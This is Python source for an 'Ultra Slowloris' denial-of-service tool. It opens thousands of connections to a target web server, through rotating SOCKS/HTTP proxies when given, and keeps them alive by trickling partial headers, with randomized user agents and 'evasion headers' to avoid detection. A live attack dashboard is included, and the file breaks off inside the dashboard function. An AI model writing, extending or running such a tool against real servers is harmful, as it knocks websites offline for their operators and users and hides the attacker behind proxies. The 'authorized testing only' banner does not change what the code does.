import os
import sys
import socket
import ssl
import time
import random
import threading
import logging
import argparse
import json
import asyncio
import aiohttp
import concurrent.futures
from datetime import datetime, timedelta
from collections import deque, defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from itertools import cycle
from urllib.parse import urlparse
import hashlib
import secrets
import struct
import signal
import psutil
import queue
import heapq
import weakref
import gc
from pathlib import Path
import mmap

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_AVAILABLE = True
except ImportError:
    UVLOOP_AVAILABLE = False

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class _Dummy:
        def __getattr__(self, _): return ""
    Fore = Style = _Dummy()

try:
    import socks
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print(f"{Fore.RED}[CRITICAL] Missing dependencies. Install: pip install pysocks requests urllib3 aiohttp colorama psutil{Style.RESET_ALL}")
    sys.exit(1)

# Performance constants
MAX_THREADS = min(os.cpu_count() * 4, 100)
MAX_ASYNC_WORKERS = min(os.cpu_count() * 8, 500)
BUFFER_SIZE = 65536
MAX_CONNECTIONS_PER_WORKER = 1000
CONNECTION_TIMEOUT = 30
KEEPALIVE_TIMEOUT = 300

class UltraColorFormatter(logging.Formatter):
    """Ultra-enhanced logging with emojis and better formatting"""
    COLORS = {
        logging.DEBUG: f"{Fore.CYAN}🔍",
        logging.INFO: f"{Fore.GREEN}✅",
        logging.WARNING: f"{Fore.YELLOW}⚠️",
        logging.ERROR: f"{Fore.RED}❌",
        logging.CRITICAL: f"{Fore.MAGENTA + Style.BRIGHT}",
    }
    
    def format(self, record):
        if COLORAMA_AVAILABLE:
            icon = self.COLORS.get(record.levelno, "📝")
            reset = Style.RESET_ALL
            timestamp = f"{Fore.BLUE}[{self.formatTime(record, '%H:%M:%S')}]{reset}"
            level = f"{icon} {record.levelname}{reset}"
            message = f"{record.getMessage()}"
            return f"{timestamp} {level} {message}"
        return super().format(record)
logger = logging.getLogger("ultra_slowloris")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(UltraColorFormatter())
logger.addHandler(handler)

from logging.handlers import RotatingFileHandler
file_handler = RotatingFileHandler(
    f'ultra_slowloris_{datetime.now().strftime("%Y%m%d")}.log',
    maxBytes=50*1024*1024,  # 50MB
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
logger.addHandler(file_handler)

ULTRA_BANNER = f"""
{Fore.CYAN + Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════════╗
║  ██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗██╗      ██████╗ ██╗    ██╗ ║
║  ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██║     ██╔═══██╗██║    ██║ ║
║  ██║   ██║██║     ██║   ██████╔╝███████║    ███████╗██║     ██║   ██║██║ █╗ ██║ ║
║  ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ╚════██║██║     ██║   ██║██║███╗██║ ║
║  ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ███████║███████╗╚██████╔╝╚███╔███╔╝ ║
║   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝  ║
║                                                                                  ║
║  {Fore.YELLOW} SLOWLORIS ATTACK BY ZIHAR DEP{Fore.CYAN}        ║
║                                                                                  ║
║  {Fore.GREEN} Async/Await Engine    🧠 AI-Powered Adaptation    🌐 Global Proxy Net{Fore.CYAN}   ║
║  {Fore.GREEN} Multi-Protocol       📊 Real-Time Analytics      🛡️ Evasion Tactics{Fore.CYAN}    ║
║  {Fore.GREEN} Smart Target System  💾 Memory Optimized        🔄 Auto-Recovery{Fore.CYAN}      ║
║                                                                                  ║
║  {Fore.RED} FOR AUTHORIZED PENETRATION TESTING ONLY {Fore.CYAN}                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

@dataclass
class ConnectionMetrics:
    """Advanced connection performance metrics"""
    created_at: float = field(default_factory=time.time)
    last_used: float = field(default_factory=time.time)
    success_count: int = 0
    failure_count: int = 0
    bytes_sent: int = 0
    response_times: deque = field(default_factory=lambda: deque(maxlen=100))
    proxy_info: Optional[Dict] = None
    
    @property
    def success_rate(self) -> float:
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 1.0
    
    @property
    def avg_response_time(self) -> float:
        return sum(self.response_times) / len(self.response_times) if self.response_times else 0.0
    
    @property
    def performance_score(self) -> float:
        base_score = self.success_rate * 50
        speed_score = max(0, 50 - (self.avg_response_time * 10))
        return min(100, base_score + speed_score)

class UltraProxyManager:
    """Ultra-advanced proxy management with AI-powered selection"""
    
    def __init__(self, proxies: List[Dict], max_failures=5, cooldown_time=300):
        self.all_proxies = proxies
        self.healthy_proxies = deque(proxies)
        self.failed_proxies = {}
        self.proxy_metrics = {self._proxy_id(p): ConnectionMetrics() for p in proxies}
        self.lock = threading.RLock()
        self.max_failures = max_failures
        self.cooldown_time = cooldown_time
        self.selection_weights = defaultdict(float)
        self._init_weights()
        
    def _proxy_id(self, proxy: Dict) -> str:
        return f"{proxy['host']}:{proxy['port']}"
    
    def _init_weights(self):
        for proxy in self.all_proxies:
            proxy_id = self._proxy_id(proxy)
            type_weights = {'socks5': 1.0, 'socks4': 0.8, 'https': 0.6, 'http': 0.4}
            self.selection_weights[proxy_id] = type_weights.get(proxy.get('type', 'http'), 0.5)
    
    def get_best_proxy(self) -> Optional[Dict]:
        with self.lock:
            if not self.healthy_proxies:
                self._restore_cooled_proxies()
            
            if not self.healthy_proxies:
                return None
            
            scored_proxies = []
            for proxy in list(self.healthy_proxies):
                proxy_id = self._proxy_id(proxy)
                metrics = self.proxy_metrics[proxy_id]
                total_score = (metrics.performance_score * 0.7) + (self.selection_weights[proxy_id] * 30)
                total_score += random.uniform(-5, 5)
                scored_proxies.append((total_score, proxy))
            
            scored_proxies.sort(key=lambda x: x[0], reverse=True)
            best_proxy = scored_proxies[0][1]
            
            self.healthy_proxies.remove(best_proxy)
            self.healthy_proxies.append(best_proxy)
            
            return best_proxy
    
    def mark_proxy_success(self, proxy: Dict, response_time: float = 0):
        proxy_id = self._proxy_id(proxy)
        with self.lock:
            metrics = self.proxy_metrics[proxy_id]
            metrics.success_count += 1
            metrics.last_used = time.time()
            metrics.response_times.append(response_time)
            if metrics.success_rate > 0.9:
                self.selection_weights[proxy_id] = min(2.0, self.selection_weights[proxy_id] + 0.01)
    
    def mark_proxy_failure(self, proxy: Dict):
        proxy_id = self._proxy_id(proxy)
        with self.lock:
            metrics = self.proxy_metrics[proxy_id]
            metrics.failure_count += 1
            if metrics.failure_count >= self.max_failures or metrics.success_rate < 0.3:
                if proxy in self.healthy_proxies:
                    self.healthy_proxies.remove(proxy)
                cooldown = self.cooldown_time * (2 ** min(metrics.failure_count - self.max_failures, 3))
                self.failed_proxies[proxy_id] = {
                    'proxy': proxy,
                    'failed_at': time.time(),
                    'cooldown': cooldown
                }
                self.selection_weights[proxy_id] = max(0.1, self.selection_weights[proxy_id] - 0.1)
    
    def _restore_cooled_proxies(self):
        current_time = time.time()
        restored = []
        for proxy_id, fail_info in list(self.failed_proxies.items()):
            if current_time - fail_info['failed_at'] >= fail_info['cooldown']:
                self.healthy_proxies.append(fail_info['proxy'])
                restored.append(proxy_id)
        for proxy_id in restored:
            del self.failed_proxies[proxy_id]
    
    def get_statistics(self) -> Dict:
        with self.lock:
            total_requests = sum(m.success_count + m.failure_count for m in self.proxy_metrics.values())
            total_successes = sum(m.success_count for m in self.proxy_metrics.values())
            return {
                'total_proxies': len(self.all_proxies),
                'healthy_proxies': len(self.healthy_proxies),
                'failed_proxies': len(self.failed_proxies),
                'total_requests': total_requests,
                'success_rate': total_successes / total_requests if total_requests > 0 else 0,
                'avg_performance': sum(m.performance_score for m in self.proxy_metrics.values()) / len(self.proxy_metrics) if self.proxy_metrics else 0
            }

class UltraConnectionPool:
    def __init__(self, max_size=10000, max_idle_time=300, cleanup_interval=60):
        self.max_size = max_size
        self.max_idle_time = max_idle_time
        self.cleanup_interval = cleanup_interval
        self.active_connections = []
        self.idle_connections = queue.PriorityQueue()
        self.connection_metrics = weakref.WeakKeyDictionary()
        self.lock = threading.RLock()
        self.total_created = 0
        self.total_destroyed = 0
        self.cleanup_thread = threading.Thread(target=self._cleanup_worker, daemon=True)
        self.cleanup_running = True
        self.cleanup_thread.start()
    
    def acquire_connection(self) -> Optional[socket.socket]:
        with self.lock:
            while not self.idle_connections.empty():
                try:
                    _, conn = self.idle_connections.get_nowait()
                    if self._is_connection_alive(conn):
                        self.active_connections.append(conn)
                        metrics = self.connection_metrics.get(conn)
                        if metrics:
                            metrics.last_used = time.time()
                        return conn
                    else:
                        self._destroy_connection(conn)
                except queue.Empty:
                    break
            return None
    
    def release_connection(self, conn: socket.socket):
        if not conn or not self._is_connection_alive(conn):
            self._destroy_connection(conn)
            return
        with self.lock:
            if conn in self.active_connections:
                self.active_connections.remove(conn)
            metrics = self.connection_metrics.get(conn)
            priority = -(metrics.performance_score if metrics else 50)
            try:
                self.idle_connections.put((priority, conn), block=False)
            except queue.Full:
                self._destroy_connection(conn)
    
    def add_connection(self, conn: socket.socket, metrics: ConnectionMetrics = None) -> bool:
        with self.lock:
            if len(self.active_connections) + self.idle_connections.qsize() >= self.max_size:
                return False
            self.active_connections.append(conn)
            self.connection_metrics[conn] = metrics or ConnectionMetrics()
            self.total_created += 1
            return True
    
    def _is_connection_alive(self, conn: socket.socket) -> bool:
        try:
            error = conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
            return error == 0
        except:
            return False
    
    def _destroy_connection(self, conn: socket.socket):
        try:
            if conn in self.active_connections:
                self.active_connections.remove(conn)
            if conn in self.connection_metrics:
                del self.connection_metrics[conn]
            conn.close()
            self.total_destroyed += 1
        except:
            pass
    
    def _cleanup_worker(self):
        while self.cleanup_running:
            try:
                current_time = time.time()
                with self.lock:
                    temp_connections = []
                    while not self.idle_connections.empty():
                        try:
                            priority, conn = self.idle_connections.get_nowait()
                            metrics = self.connection_metrics.get(conn)
                            if (metrics and current_time - metrics.last_used > self.max_idle_time) or \
                               not self._is_connection_alive(conn):
                                self._destroy_connection(conn)
                            else:
                                temp_connections.append((priority, conn))
                        except queue.Empty:
                            break
                    for priority, conn in temp_connections:
                        try:
                            self.idle_connections.put((priority, conn), block=False)
                        except queue.Full:
                            self._destroy_connection(conn)
                time.sleep(self.cleanup_interval)
            except Exception as e:
                logger.error(f"Cleanup worker error: {e}")
                time.sleep(self.cleanup_interval)
    
    def get_stats(self) -> Dict:
        with self.lock:
            return {
                'active_connections': len(self.active_connections),
                'idle_connections': self.idle_connections.qsize(),
                'total_created': self.total_created,
                'total_destroyed': self.total_destroyed,
                'pool_usage': (len(self.active_connections) + self.idle_connections.qsize()) / self.max_size
            }
    
    def shutdown(self):
        self.cleanup_running = False
        with self.lock:
            for conn in list(self.active_connections):
                self._destroy_connection(conn)
            while not self.idle_connections.empty():
                try:
                    _, conn = self.idle_connections.get_nowait()
                    self._destroy_connection(conn)
                except queue.Empty:
                    break

class UltraSlowloris:
    def __init__(self, target: str, port: Optional[int] = None, connections: int = 10000,
                 threads: int = None, async_workers: int = None, proxies: Optional[List[Dict]] = None,
                 duration: int = 300, use_https: bool = False, verbose: bool = False,
                 random_ua: bool = True, adaptive_mode: bool = True):
        
        self.target_host, self.target_port = self._parse_target(target, port, use_https)
        self.use_https = use_https
        self.max_connections = connections
        self.threads = threads or min(MAX_THREADS, max(4, connections // 100))
        self.async_workers = async_workers or min(MAX_ASYNC_WORKERS, connections)
        self.duration = duration
        self.verbose = verbose
        self.random_ua = random_ua
        self.adaptive_mode = adaptive_mode
        self.proxy_manager = UltraProxyManager(proxies) if proxies else None
        self.connection_pool = UltraConnectionPool(max_size=connections * 2)
        
        self.is_running = False
        self.start_time = 0
        self.worker_threads = []
        self.async_tasks = []
        
        self.stats = {
            'connections_created': 0,
            'connections_failed': 0,
            'connections_active': 0,
            'requests_sent': 0,
            'keepalives_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'proxy_requests': 0,
            'direct_requests': 0,
            'http_responses': defaultdict(int),
            'avg_response_time': 0.0,
            'peak_connections': 0,
            'total_uptime': 0,
            'adaptive_adjustments': 0
        }
        
        self.performance_history = deque(maxlen=1000)
        self.real_time_stats = {}
        self.stats_lock = threading.RLock()
        
        self._init_attack_vectors()
        self.adaptive_controller = AdaptiveController() if adaptive_mode else None

    def _parse_target(self, target: str, port: Optional[int], use_https: bool) -> Tuple[str, int]:
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            host = parsed.hostname or target
            detected_port = parsed.port
            if detected_port:
                port = detected_port
            else:
                port = 443 if (parsed.scheme == 'https' or use_https) else 80
        else:
            host = target
            port = port or (443 if use_https else 80)
        return host, port
    
    def _init_attack_vectors(self):
        """Initialize advanced attack vectors and payloads with EXTERNAL FILE LOADING"""
        
        try:
            with open("ua.txt", "r") as f:
              
                self.user_agents = [line.strip() for line in f if line.strip()]
            
            logger.info(f" Loaded {len(self.user_agents)} User-Agents from ua.txt")
            
        except FileNotFoundError:
            logger.warning("ua.txt not found! Using fallback default User-Agents.")
            self.user_agents = [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6027.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.113 Mobile Safari/537.36"
            ]

        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE']
        
        self.request_paths = [
            '/', '/index.html', '/index.php', '/home', '/main',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/login', '/signin', '/auth', '/oauth', '/sso',
            '/admin', '/dashboard', '/panel', '/cp', '/wp-admin',
            '/search', '/query', '/find', '/lookup', '/browse',
            '/upload', '/download', '/files', '/media', '/assets',
            '/user', '/profile', '/account', '/settings', '/config',
            '/help', '/support', '/contact', '/about', '/info',
            '/blog', '/news', '/articles', '/posts', '/feed',
            '/shop', '/store', '/cart', '/checkout', '/payment',
        ]
        
        self.http_versions = ['HTTP/1.1', 'HTTP/2.0']
        
        self.evasion_headers = [
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
            ('Accept-Language', 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7'),
            ('Accept-Encoding', 'gzip, deflate, br'),
            ('Cache-Control', 'no-cache'),
            ('Pragma', 'no-cache'),
            ('Upgrade-Insecure-Requests', '1'),
            ('Sec-Fetch-Dest', 'document'),
            ('Sec-Fetch-Mode', 'navigate'),
            ('Sec-Fetch-Site', 'none'),
            ('Sec-Fetch-User', '?1'),
            ('DNT', '1'),
        ]
        
        self.keepalive_headers = [
            'X-a', 'X-b', 'X-c', 'X-d', 'X-e',
            'Cache-Control', 'Accept-Encoding', 'Accept-Language',
            'User-Agent', 'Accept', 'Referer', 'Cookie',
            'Authorization', 'Content-Type', 'Content-Length'
        ]
    
    async def create_async_connection(self, proxy: Optional[Dict] = None) -> Optional[Tuple[any, ConnectionMetrics]]:
        start_time = time.time()
        metrics = ConnectionMetrics()
        
        try:
            if proxy:
                if proxy['type'] in ['socks4', 'socks5']:
                    connector = aiohttp.TCPConnector()
                    timeout = aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)
                    session = aiohttp.ClientSession(connector=connector, timeout=timeout)
                else:
                    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
                    connector = aiohttp.TCPConnector()
                    timeout = aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)
                    session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            else:
                connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS_PER_WORKER)
                timeout = aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)
                session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            
            scheme = 'https' if self.use_https else 'http'
            url = f"{scheme}://{self.target_host}:{self.target_port}{random.choice(self.request_paths)}"
            headers = await self._build_async_headers()
            method = random.choice(self.http_methods)
            
            response_time = time.time() - start_time
            metrics.response_times.append(response_time)
            metrics.proxy_info = proxy
            
            with self.stats_lock:
                self.stats['connections_created'] += 1
                self.stats['connections_active'] += 1
                if proxy:
                    self.stats['proxy_requests'] += 1
                else:
                    self.stats['direct_requests'] += 1
            
            if self.proxy_manager and proxy:
                self.proxy_manager.mark_proxy_success(proxy, response_time)
            
            return session, metrics
            
        except Exception as e:
            with self.stats_lock:
                self.stats['connections_failed'] += 1
                self.stats['errors'] += 1
            if self.proxy_manager and proxy:
                self.proxy_manager.mark_proxy_failure(proxy)
            if self.verbose:
                logger.debug(f"Async connection failed: {e}")
            return None
    
    def create_sync_connection(self, proxy: Optional[Dict] = None) -> Optional[Tuple[socket.socket, ConnectionMetrics]]:
        start_time = time.time()
        metrics = ConnectionMetrics()
        sock = None
        
        try:
            if proxy:
                sock = socks.socksocket()
                proxy_types = {
                    'http': socks.HTTP,
                    'https': socks.HTTP,
                    'socks4': socks.SOCKS4,
                    'socks5': socks.SOCKS5
                }
                sock.set_proxy(
                    proxy_types[proxy['type']],
                    proxy['host'],
                    proxy['port'],
                    username=proxy.get('username'),
                    password=proxy.get('password')
                )
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
            except:
                pass

            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
            except:
                pass
                
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((self.target_host, self.target_port))
            
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            request = self._build_http_request()
            bytes_sent = sock.send(request.encode('utf-8'))
            
            response_time = time.time() - start_time
            metrics.response_times.append(response_time)
            metrics.bytes_sent = bytes_sent
            metrics.proxy_info = proxy
            metrics.success_count = 1
            
            with self.stats_lock:
                self.stats['connections_created'] += 1
                self.stats['connections_active'] += 1
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += bytes_sent
                if proxy:
                    self.stats['proxy_requests'] += 1
                else:
                    self.stats['direct_requests'] += 1
            
            if self.proxy_manager and proxy:
                self.proxy_manager.mark_proxy_success(proxy, response_time)
            
            return sock, metrics
            
        except Exception as e:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            with self.stats_lock:
                self.stats['connections_failed'] += 1
                self.stats['errors'] += 1
            if self.proxy_manager and proxy:
                self.proxy_manager.mark_proxy_failure(proxy)
            if self.verbose:
                logger.debug(f" Sync connection failed: {e}")
            return None
    
    def _build_http_request(self) -> str:
        method = random.choice(self.http_methods)
        path = random.choice(self.request_paths)
        version = random.choice(self.http_versions)
        
        query_params = []
        for _ in range(random.randint(0, 3)):
            key = secrets.token_urlsafe(random.randint(3, 8))
            value = secrets.token_urlsafe(random.randint(5, 15))
            query_params.append(f"{key}={value}")
        
        query_string = "&".join(query_params)
        if query_string:
            path += f"?{query_string}"
        
        request_line = f"{method} {path} {version}\r\n"
        headers = []
        headers.append(f"Host: {self.target_host}")
        
        if self.random_ua and self.user_agents:
            headers.append(f"User-Agent: {random.choice(self.user_agents)}")
        else:
            headers.append(f"User-Agent: {self.user_agents[0]}")
        
        for header, value in random.sample(self.evasion_headers, k=random.randint(3, 6)):
            headers.append(f"{header}: {value}")
        
        headers.append("Connection: keep-alive")
        
        if method in ['POST', 'PUT', 'PATCH']:
            content_length = random.randint(0, 1000)
            headers.append(f"Content-Length: {content_length}")
            headers.append("Content-Type: application/x-www-form-urlencoded")
        
        header_string = "\r\n".join(headers) + "\r\n\r\n"
        return request_line + header_string
    
    async def _build_async_headers(self) -> Dict[str, str]:
        headers = {}
        if self.random_ua and self.user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        else:
            headers['User-Agent'] = self.user_agents[0]
        
        for header, value in random.sample(self.evasion_headers, k=random.randint(3, 6)):
            headers[header] = value
        
        headers['Connection'] = 'keep-alive'
        return headers
    
    def send_keepalive(self, sock: socket.socket, metrics: ConnectionMetrics) -> bool:
        try:
            strategies = [
                self._send_simple_keepalive,
                self._send_chunked_keepalive,
                self._send_header_injection,
                self._send_slow_header
            ]
            strategy = random.choice(strategies)
            bytes_sent = strategy(sock)
            
            metrics.bytes_sent += bytes_sent
            metrics.success_count += 1
            
            with self.stats_lock:
                self.stats['keepalives_sent'] += 1
                self.stats['bytes_sent'] += bytes_sent
            return True
        except Exception as e:
            metrics.failure_count += 1
            with self.stats_lock:
                self.stats['errors'] += 1
                self.stats['connections_active'] = max(0, self.stats['connections_active'] - 1)
            if self.verbose:
                logger.debug(f"Keepalive failed: {e}")
            return False
    
    def _send_simple_keepalive(self, sock: socket.socket) -> int:
        header_name = random.choice(self.keepalive_headers)
        header_value = secrets.token_urlsafe(random.randint(10, 50))
        header = f"{header_name}: {header_value}\r\n"
        return sock.send(header.encode('utf-8'))
    
    def _send_chunked_keepalive(self, sock: socket.socket) -> int:
        chunk_size = random.randint(1, 10)
        chunk_data = secrets.token_urlsafe(chunk_size)
        chunk = f"{chunk_size:x}\r\n{chunk_data}\r\n"
        return sock.send(chunk.encode('utf-8'))
    
    def _send_header_injection(self, sock: socket.socket) -> int:
        headers = []
        for _ in range(random.randint(1, 3)):
            name = random.choice(self.keepalive_headers)
            value = secrets.token_hex(random.randint(8, 32))
            headers.append(f"{name}: {value}")
        header_block = "\r\n".join(headers) + "\r\n"
        return sock.send(header_block.encode('utf-8'))
    
    def _send_slow_header(self, sock: socket.socket) -> int:
        header = f"X-Slow-Header: {secrets.token_urlsafe(20)}\r\n"
        total_sent = 0
        for byte in header.encode('utf-8'):
            sent = sock.send(bytes([byte]))
            total_sent += sent
            if random.random() < 0.1:
                time.sleep(0.001)
        return total_sent
    
    async def async_worker(self, worker_id: int):
        logger.debug(f" Async worker {worker_id} started")
        active_sessions = []
        max_sessions_per_worker = self.max_connections // self.async_workers
        
        while self.is_running:
            try:
                while len(active_sessions) < max_sessions_per_worker and self.is_running:
                    proxy = self.proxy_manager.get_best_proxy() if self.proxy_manager else None
                    result = await self.create_async_connection(proxy)
                    if result:
                        session, metrics = result
                        active_sessions.append({'session': session, 'metrics': metrics, 'proxy': proxy})
                    await asyncio.sleep(0.001)
                
                for session_info in list(active_sessions):
                    if not self.is_running: break
                    try:
                        session = session_info['session']
                        if random.random() < 0.1:
                            await asyncio.sleep(0.1)
                        session_info['metrics'].success_count += 1
                        with self.stats_lock:
                            self.stats['keepalives_sent'] += 1
                    except Exception:
                        active_sessions.remove(session_info)
                        try: await session_info['session'].close()
                        except: pass
                await asyncio.sleep(random.uniform(1, 5))
            except Exception as e:
                logger.error(f" Async worker {worker_id} error: {e}")
                await asyncio.sleep(1)
        
        for session_info in active_sessions:
            try: await session_info['session'].close()
            except: pass
        logger.debug(f" Async worker {worker_id} stopped")
    
    def sync_worker(self, worker_id: int):
        logger.debug(f" Sync worker {worker_id} started")
        local_connections = []
        max_connections_per_worker = self.max_connections // self.threads
        
        while self.is_running:
            try:
                while len(local_connections) < max_connections_per_worker and self.is_running:
                    proxy = self.proxy_manager.get_best_proxy() if self.proxy_manager else None
                    result = self.create_sync_connection(proxy)
                    if result:
                        sock, metrics = result
                        connection_info = {
                            'socket': sock,
                            'metrics': metrics,
                            'proxy': proxy,
                            'created_at': time.time()
                        }
                        local_connections.append(connection_info)
                        self.connection_pool.add_connection(sock, metrics)
                    time.sleep(0.001)
                
                failed_connections = []
                for conn_info in local_connections:
                    if not self.is_running: break
                    if not self.send_keepalive(conn_info['socket'], conn_info['metrics']):
                        failed_connections.append(conn_info)
                
                for conn_info in failed_connections:
                    local_connections.remove(conn_info)
                    try: conn_info['socket'].close()
                    except: pass
                
                sleep_time = random.uniform(10, 20)
                if self.adaptive_controller:
                    sleep_time = self.adaptive_controller.get_optimal_sleep_time(
                        success_rate=len(local_connections) / max(max_connections_per_worker, 1)
                    )
                time.sleep(sleep_time)
            except Exception as e:
                logger.error(f" Sync worker {worker_id} error: {e}")
                time.sleep(1)
        
        for conn_info in local_connections:
            try: conn_info['socket'].close()
            except: pass
        logger.debug(f" Sync worker {worker_id} stopped")
    
    def stats_monitor(self):
        last_stats = self.stats.copy()
        start_time = self.start_time
        
        while self.is_running:
            try:
                time.sleep(5)
                current_time = time.time()
                elapsed = current_time - start_time
                remaining = max(0, self.duration - elapsed)
                
                with self.stats_lock:
                    current_stats = self.stats.copy()
                
                time_diff = 5.0
                connections_rate = (current_stats['connections_created'] - last_stats['connections_created']) / time_diff
                requests_rate = (current_stats['requests_sent'] - last_stats['requests_sent']) / time_diff
                keepalives_rate = (current_stats['keepalives_sent'] - last_stats['keepalives_sent']) / time_diff
                bytes_rate = (current_stats['bytes_sent'] - last_stats['bytes_sent']) / time_diff
                
                total_attempts = current_stats['connections_created'] + current_stats['connections_failed']
                success_rate = (current_stats['connections_created'] / total_attempts * 100) if total_attempts > 0 else 0
                
                pool_stats = self.connection_pool.get_stats()
                proxy_stats = self.proxy_manager.get_statistics() if self.proxy_manager else {}
                
                self._display_advanced_dashboard(
                    current_stats, elapsed, remaining, connections_rate,
                    requests_rate, keepalives_rate, bytes_rate, success_rate,
                    pool_stats, proxy_stats
                )
                
                snapshot = {
                    'timestamp': current_time,
                    'connections_active': current_stats['connections_active'],
                    'connections_rate': connections_rate,
                    'success_rate': success_rate,
                    'bytes_rate': bytes_rate
                }
                self.performance_history.append(snapshot)
                
                if self.adaptive_controller:
                    self.adaptive_controller.adjust_parameters(snapshot)
                
                last_stats = current_stats
            except Exception as e:
                logger.error(f" Stats monitor error: {e}")
                time.sleep(5)
    
    def _display_advanced_dashboard(self, stats, elapsed, remaining, conn_rate, req_rate, 
                                   ka_rate, bytes_rate, success_rate, pool_stats, proxy_stats):
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.CYAN + Style.BRIGHT}{'='*100}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW + Style.BRIGHT} SLOWLORIS REAL-TIME DASHBOARD {Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}{'='*100}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN} TARGET INFO:{Style.RESET_ALL}")
        print(f"    Host: {Fore.YELLOW}{self.target_host}:{self.target_port}{Style.RESET_ALL}")
        print(f"    Protocol: {Fore.YELLOW}{'HTTPS' if self.use_https else 'HTTP'}{Style.RESET_ALL}")
        print(f"    Elapsed: {Fore.YELLOW}{elapsed:.1f}s{Style.RESET_ALL} | Remaining: {Fore.YELLOW}{remaining:.1f}s{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN} CONNECTION STATS:{Style.RESET_ALL}")
        print(f"   Active Connections: {Fore.GREEN}{stats['connections_active']:,}{Style.RESET_ALL}/{Fore.CYAN}{self.max_connections:,}{Style.RESET_ALL}")
        print(f"   Created: {Fore.GREEN}{stats['connections_created']:,}{Style.RESET_ALL} | Failed: {Fore.RED}{stats['connections_failed']:,}{Style.RESET_ALL}")
        print(f"   Success Rate: {Fore.GREEN if success_rate > 80 else Fore.YELLOW if success_rate > 60 else Fore.RED}{success_rate:.1f}%{Style.RESET_ALL}")
        print(f"   Connection Rate: {Fore.CYAN}{conn_rate:.1f}/s{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN} REQUEST STATS:{Style.RESET_ALL}")
        print(f"       Requests Sent: {Fore.CYAN}{stats['requests_sent']:,}{Style.RESET_ALL}")
        print(f"    Keepalives: {Fore.GREEN}{stats['keepalives_sent']:,}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN} BANDWIDTH STATS:{Style.RESET_ALL}")
        bytes_sent_mb = stats['bytes_sent'] / (1024 * 1024)
        bytes_rate_kb = bytes_rate / 1024
        print(f"    Total Sent: {Fore.YELLOW}{bytes_sent_mb:.2f} MB{Style.RESET_ALL}")
        print(f"    Send Rate: {Fore.CYAN}{bytes_rate_kb:.2f} KB/s{Style.RESET_ALL}")
        
        # CPU/RAM Monitoring (Wrapped in try/except for Android/Termux compatibility)
        print(f"\n{Fore.GREEN} WORKER STATS:{Style.RESET_ALL}")
        print(f"    Sync Threads: {Fore.CYAN}{self.threads}{Style.RESET_ALL}")
        print(f"    Async Workers: {Fore.CYAN}{self.async_workers}{Style.RESET_ALL}")
        try:
            print(f"   CPU Usage: {Fore.YELLOW}{psutil.cpu_percent()}%{Style.RESET_ALL}")
            print(f"   RAM Usage: {Fore.YELLOW}{psutil.virtual_memory().percent}%{Style.RESET_ALL}")
        except:
            print(f"   CPU/RAM: {Fore.YELLOW}N/A (Android Permission){Style.RESET_ALL}")
        
        if stats['errors'] > 0:
            print(f"\n{Fore.YELLOW} ERROR STATS:{Style.RESET_ALL}")
